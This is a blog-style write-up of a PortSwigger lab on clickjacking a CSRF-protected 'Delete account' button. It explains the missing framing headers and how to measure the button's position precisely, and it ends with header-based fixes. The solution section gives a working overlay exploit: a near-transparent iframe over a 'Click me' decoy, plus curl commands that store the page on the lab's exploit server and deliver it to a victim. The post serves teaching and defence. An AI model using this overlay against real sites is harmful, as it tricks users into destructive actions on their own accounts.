---
layout: post
title: "PortSwigger: Basic Clickjacking with CSRF Token Protection"
date: 2027-07-20 09:00:00 -0500
categories: [Web Security, Clickjacking]
tags: [portswigger, clickjacking, ui-redressing, csrf-bypass, iframe, web]
---

## Lab Summary

**Lab:** Basic clickjacking with CSRF token protection  
**Difficulty:** Apprentice  
**CWE:** [CWE-1021](https://cwe.mitre.org/data/definitions/1021.html) – Improper Restriction of Rendered UI Layers  
**Result:** Solved

---

## The Vulnerability

[Clickjacking](https://cwe.mitre.org/data/definitions/1021.html) (also called UI redressing) tricks a victim into clicking an element on a real website by loading it inside an invisible `<iframe>` and placing a decoy "Click me" button directly on top.

This lab's target has a **Delete account** button protected by a CSRF token, but the `/my-account` page sets no `X-Frame-Options` or `frame-ancestors` Content Security Policy directive — so it can be freely embedded in a cross-origin iframe.

The CSRF token is irrelevant here. Because the form submission originates from *inside* the iframe, which is same-origin with the target, the victim's browser sends the correct CSRF token automatically. The token protection is completely bypassed.

---

## The Technique

The attack overlays two elements:

| Element | Role |
|---|---|
| `<iframe>` — `opacity:0.00001`, `z-index:2` | Loads the target's `/my-account` page; invisible but fully interactive; sits *on top* |
| `<div>Click me</div>` — `z-index:1` | Decoy the victim sees; sits *underneath* the transparent iframe |

When the victim clicks the visible "Click me" text, the click is intercepted by the overlying invisible iframe and lands on the **Delete account** button at that pixel coordinate.

The critical insight is **pixel-perfect alignment** at the correct viewport width. Because the iframe is 500 px wide, the target page reflows to a 500 px layout — and the button's Y position in that layout differs significantly from its position in a full-width browser window. The lab's own hint gives `top: 300px`, but the actual button centre in the 500 px-wide viewport is at **y ≈ 554 px**. Using a headless browser to measure the element's bounding rect at the matching viewport width solves this precisely:

```python
# selenium, window-size=500x700 (matching the iframe)
btn = driver.find_element(By.CSS_SELECTOR, '#delete-account-form button')
rect = btn.rect
# → x=16, y=538, w=146, h=32  →  centre: x=89, y=554
```

---

## Solution

> **Don't trust the hint's pixel values.** The lab's official solution suggests `top: 300px` for the decoy position. The actual delete button centre in a 500 px-wide viewport is at **y ≈ 554 px** — a 254 px gap that causes the attack to miss completely. Always measure at the iframe's viewport width before building the overlay.

### 1. Confirm the page is frameable

```bash
curl -sI https://TARGET/my-account | grep -i 'x-frame-options\|frame-ancestors'
# Empty output = no framing protection = clickjacking possible
```

### 2. Log in and capture the exploit server URL

Authenticate as `wiener:peter`. The `/my-account` page surfaces a link to the lab's exploit server — copy it.

### 3. Host the iframe overlay on the exploit server

Store the following HTML as `/exploit` on the exploit server:

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.00001;   /* invisible but still intercepting clicks */
        z-index: 2;         /* sits on TOP of the decoy div */
    }
    div {
        position: absolute;
        top: 544px;
        left: 56px;
        z-index: 1;         /* visible through the transparent iframe */
    }
</style>
<div>Click me</div>
<iframe src="https://TARGET/my-account"></iframe>
```

```bash
curl -sk -X POST 'https://<exploit_server>/' \
  --data-urlencode 'responseFile=/exploit' \
  --data-urlencode 'responseHead=HTTP/1.1 200 OK' \
  --data-urlencode 'responseBody=<style>iframe{position:relative;width:500px;height:700px;opacity:0.00001;z-index:2}div{position:absolute;top:544px;left:56px;z-index:1}</style><div>Click me</div><iframe src="https://TARGET/my-account"></iframe>' \
  --data-urlencode 'formAction=STORE'
```

### 4. Deliver to victim

```bash
curl -L 'https://<exploit_server>/deliver-to-victim'
```

The bot visits the exploit page, sees "Click me", and clicks it — the click is intercepted by the invisible iframe and triggers the **Delete account** form with the victim's own CSRF token.

---

## Why It Worked

The target page had no framing protection, so the browser allowed it inside a cross-origin iframe. The CSRF token inside the form was irrelevant — the iframe's same-origin submission carries the victim's token automatically. The attacker's only task was placing the decoy label precisely over the target button.

The standard hint value (`top: 300px`) is measured at full browser width. At 500 px iframe width the page reflows and the button shifts to y ≈ 554 px — a 254 px error that makes the attack miss. Measuring at the actual iframe viewport width with headless Chromium gave the correct value on the first attempt.

---

## Fix / Defense

Set framing headers on every authenticated response:

**Nginx:**
```nginx
add_header X-Frame-Options "DENY" always;
add_header Content-Security-Policy "frame-ancestors 'none'" always;
```

**Flask / Python:**
```python
response.headers['X-Frame-Options'] = 'DENY'
response.headers['Content-Security-Policy'] = "frame-ancestors 'none'"
```

`SameSite=Strict` on session cookies also limits cross-site framing, but is not sufficient alone — an attacker with a same-site foothold can still frame the page. `X-Frame-Options: DENY` or `frame-ancestors 'none'` is the definitive fix.
